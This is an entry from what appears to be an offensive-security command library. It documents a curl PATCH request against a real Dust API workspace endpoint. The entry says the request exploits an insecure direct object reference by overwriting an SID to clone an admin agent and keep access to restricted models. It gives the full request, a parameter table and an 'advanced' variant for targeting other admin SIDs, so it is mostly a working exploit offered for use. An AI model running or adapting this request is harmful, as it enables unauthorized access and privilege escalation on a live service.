---
id: cmd-uuid-placeholder
data: >-
  curl -X PATCH
  https://eu.dust.tt/api/w/BSsJ1zPUYE/assistant/agent_configurations/JpY5xizXRo
  -H "Content-Type: application/json" -H "Cookie: redacted" -d
  '{"assistant":{"name":"gemini-pro-clone","pictureUrl":"https://dust.tt/static/emojis/bg-blue-300/brain/1f9e0","description":"An
  assistant designed to provide clear, concise, and factual responses
  efficiently.","instructions":"test-gemini-pro","status":"active","scope":"private","actions":[],"model":{"modelId":"claude-3-5-sonnet-20241022","providerId":"anthropic","temperature":0.7},"maxStepsPerRun":8,"visualizationEnabled":true,"templateId":null,"tags":[]}}'
tags:
  - api
  - patch
  - idor
type: command
output: HTTP/2 200 OK with updated agent configuration JSON
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.714Z'
verified: false
validated: true
submitted: true
---
# patch-agent-config-clone

## Command

```bash
curl -X PATCH https://eu.dust.tt/api/w/BSsJ1zPUYE/assistant/agent_configurations/JpY5xizXRo \
  -H "Content-Type: application/json" \
  -H "Cookie: redacted" \
  -d '{"assistant":{"name":"gemini-pro-clone","pictureUrl":"https://dust.tt/static/emojis/bg-blue-300/brain/1f9e0","description":"An assistant designed to provide clear, concise, and factual responses efficiently.","instructions":"test-gemini-pro","status":"active","scope":"private","actions":[],"model":{"modelId":"claude-3-5-sonnet-20241022","providerId":"anthropic","temperature":0.7},"maxStepsPerRun":8,"visualizationEnabled":true,"templateId":null,"tags":[]}}'
```

## Description

This curl command sends a PATCH request to the Dust API to update an agent's configuration, exploiting an IDOR by overwriting the SID to clone an admin agent like 'gemini-pro'. Use it after creating a new agent to persist access to restricted models.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PATCH` | Specifies the HTTP method | Yes |
| `https://eu.dust.tt/api/w/{w_id}/assistant/agent_configurations/{agent-id}` | Endpoint URL; replace {w_id} and {agent-id} | Yes |
| `-H "Content-Type: application/json"` | Sets JSON body type | Yes |
| `-H "Cookie: {session_cookie}"` | Authentication cookie | Yes |
| `-d '{payload}'` | JSON payload with SID overwrite in model config | Yes |

## Examples

### Basic Usage

```bash
curl -X PATCH https://eu.dust.tt/api/w/BSsJ1zPUYE/assistant/agent_configurations/JpY5xizXRo -H "Content-Type: application/json" -H "Cookie: redacted" -d '{...}'
```

### Advanced Usage

Adapt the payload for different SIDs or models, ensuring the 'sid' is set to the target admin value.

```bash
curl -X PATCH https://eu.dust.tt/api/w/{w_id}/assistant/agent_configurations/{agent-id} -H "Content-Type: application/json" -H "Cookie: {cookie}" -d '{ "assistant": { ... , "model": { "sid": "target-admin-sid" } } }'
```

## Expected Output

Successful execution returns HTTP 200 OK with a JSON response containing the updated agent configuration, confirming the SID overwrite and cloning.

## Related

- [[procedures/Clone-Admin-Agent-via-SID-Overwrite]]
- [[commands/curl-generic-patch]]
